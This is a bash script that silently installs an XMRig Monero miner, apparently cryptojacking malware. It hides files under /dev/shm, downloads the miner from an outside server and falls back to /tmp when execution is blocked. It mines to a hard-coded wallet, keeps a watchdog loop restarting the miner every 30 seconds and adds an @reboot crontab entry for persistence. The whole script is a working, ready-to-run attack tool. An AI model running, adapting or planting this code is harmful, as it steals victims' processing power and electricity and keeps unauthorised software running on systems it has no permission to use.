#!/bin/bash


export HOME="/dev/shm/rigd/.config/.c3pool"
MINER_SUBDIR="$HOME/c3pool"
WALLET="46FP3DQetYzXjMCfns9HEChTzFynnThvY3bXRiELmrRr2yN6zr5YBu4bs8VWjYxdH4ASQsN89Xb4qDjfjTNW35iCKpNJNX7"


mkdir -p "$MINER_SUBDIR"
cd "$MINER_SUBDIR" || exit 1


echo "[*] Downloading xmrig.tar.gz..."
curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz -o xmrig.tar.gz

if file xmrig.tar.gz | grep -q 'gzip compressed'; then
    echo "[*] Extracting..."
    tar -xzf xmrig.tar.gz
    chmod +x xmrig
else
    echo "[!] Error: File is not gzip archive. Aborting."
    exit 1
fi


if ! ./xmrig --help > /dev/null 2>&1; then
    echo "[!] Error: xmrig cannot run here, maybe /dev/shm is mounted with noexec."
    
    TMP_EXEC="/tmp/xmrig_run"
    cp xmrig "$TMP_EXEC"
    chmod +x "$TMP_EXEC"
    if "$TMP_EXEC" --help > /dev/null 2>&1; then
        echo "[*] xmrig works from /tmp. Akan dijalankan dari sana."
        echo "$TMP_EXEC" > "$MINER_SUBDIR/fallback_bin"
    else
        echo "[!] xmrig tetap tidak jalan. Mungkin arsitektur tidak cocok."
        exit 1
    fi
else
    echo "$MINER_SUBDIR/xmrig" > "$MINER_SUBDIR/fallback_bin"
fi


cat > config_background.json <<EOF
{
    "autosave": true,
    "background": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.c3pool.com:13333",
            "user": "$WALLET",
            "pass": "c3pool",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF


cat > "$HOME/watchdog.sh" <<EOF
#!/bin/bash
BIN_PATH=\$(cat "$MINER_SUBDIR/fallback_bin")
CONFIG="$MINER_SUBDIR/config_background.json"
LOGFILE="$MINER_SUBDIR/xmrig.log"

while true; do
    if ! pgrep -f "\$BIN_PATH" > /dev/null; then
        echo "[\$(date)] xmrig not running. Starting..." >> "\$LOGFILE"
        nohup "\$BIN_PATH" --config="\$CONFIG" >> "\$LOGFILE" 2>&1 &
    fi
    sleep 30
done
EOF

chmod +x "$HOME/watchdog.sh"
pkill -f "$HOME/watchdog.sh" 2>/dev/null
nohup "$HOME/watchdog.sh" > /dev/null 2>&1 &


if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null; echo "@reboot nohup $HOME/watchdog.sh > /dev/null 2>&1 &") | crontab -
fi

echo "[✓] Done. Miner running from: \$(cat "$MINER_SUBDIR/fallback_bin")"
